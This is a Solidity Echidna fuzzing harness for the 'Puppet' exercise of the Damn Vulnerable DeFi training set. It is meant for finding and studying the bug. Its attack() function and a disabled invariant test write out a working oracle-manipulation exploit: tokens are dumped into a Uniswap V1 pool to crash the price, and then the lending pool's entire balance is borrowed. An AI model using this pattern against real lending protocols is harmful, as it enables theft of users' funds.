pragma solidity ^0.8.0;

import "@common/uniswap/UniswapV1Exchange.sol";
import "@common/DamnValuableToken.sol";

import "../src/PuppetPool.sol";
import "./Deployer.sol";

/// @dev Run the template with
///      ```
///      cd repo
///      solc-select use 0.8.0
///      echidna test/Invariants.sol --contract Echidna --config test/echidna.config.yaml
///      ```
contract Echidna {
    using Address for address payable;

    enum TestingLevel {
        EducatedGuess,
        SuspectFunctions,
        Naive
    }

    Deployer _deployer;

    DamnValuableToken _token;
    PuppetPool _pool;
    UniswapV1Exchange _exchange;

    uint256 public constant ATTACKER_TOKENS = 1000 ether;
    uint256 public constant ATTACKER_ETH = 25 ether;

    uint256 _initialPoolTokenBalance;

    TestingLevel private _testingLevel = TestingLevel.SuspectFunctions;

    error OnlyTestingLevel(TestingLevel supported);

    constructor() payable {
        _deployer = new Deployer();
        _initialPoolTokenBalance = _deployer.POOL_INITIAL_TOKEN_BALANCE();

        uint256 uniswapEth = _deployer.UNISWAP_INITIAL_ETH_RESERVE();

        require(
            address(this).balance == uniswapEth + ATTACKER_ETH,
            "Invariants: incorrect ETH"
        );

        (_token, _pool, _exchange) = _deployer.deploy{value: uniswapEth}();

        _deployer.transfer(address(this), ATTACKER_TOKENS);
    }

    modifier onlyTestingLevel(TestingLevel testingLevel) {
        if (_testingLevel != testingLevel) {
            revert OnlyTestingLevel(testingLevel);
        }

        // Underscore is a special character only used inside
        // a function modifier and it tells Solidity to
        // execute the rest of the code.
        _;
    }

    // //////////////
    // EDUCATED GUESS
    // //////////////

    function attack() external onlyTestingLevel(TestingLevel.EducatedGuess) {
        _token.approve(address(_exchange), ATTACKER_TOKENS);
        _exchange.tokenToEthSwapInput(
            ATTACKER_TOKENS,
            // @audit-info min-eth needs to be > 0
            1, // min eth
            block.timestamp + 1 hours
        );
        _pool.borrow{value: address(this).balance}(
            _initialPoolTokenBalance,
            address(this)
        );
        _exchange.ethToTokenSwapInput{value: address(this).balance}(
            1, // min token
            block.timestamp + 1 hours
        );
    }

    // /////////////////
    // SUSPECT FUNCTIONS
    // /////////////////

    function approve(
        uint256 amount
    ) external onlyTestingLevel(TestingLevel.SuspectFunctions) {
        _token.approve(address(_exchange), amount);
    }

    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external onlyTestingLevel(TestingLevel.SuspectFunctions) {
        _exchange.tokenToEthSwapInput(tokens_sold, min_eth, deadline);
    }

    function borrow(
        uint256 amount
    ) external onlyTestingLevel(TestingLevel.SuspectFunctions) {
        _pool.borrow{value: address(this).balance}(amount, address(this));
    }

    function ethToTokenSwapInput(
        uint256 min_tokens,
        uint256 deadline
    ) external onlyTestingLevel(TestingLevel.SuspectFunctions) {
        _exchange.ethToTokenSwapInput{value: address(this).balance}(
            min_tokens,
            deadline
        );
    }

    // ////////////////////
    // INVARIANT PROPERTIES
    // ////////////////////

    // @audit-info if can't get educated guess to work, try implementing it in an invariant property, getting it to pass.
    function echidna_test_attack_doesnt_revert() external returns (bool) {
        revert("Disabled");

        _token.approve(address(_exchange), ATTACKER_TOKENS);
        _exchange.tokenToEthSwapInput(
            ATTACKER_TOKENS,
            // @audit-info min-eth needs to be > 0
            1, // min eth
            block.timestamp + 1 hours
        );
        _pool.borrow{value: address(this).balance}(
            _initialPoolTokenBalance,
            address(this)
        );
        _exchange.ethToTokenSwapInput{value: address(this).balance}(
            1, // min token
            block.timestamp + 1 hours
        );
        return true;
    }

    function echidna_cannot_empty_tokens_from_pool()
        public
        view
        returns (bool)
    {
        return _token.balanceOf(address(_pool)) > 0;
    }

    function echidna_cannot_take_all_tokens_from_pool()
        public
        view
        returns (bool)
    {
        return _token.balanceOf(address(this)) < _initialPoolTokenBalance;
    }

    // @audit-info if receive is missing, educated guess will fail
    receive() external payable {}
}
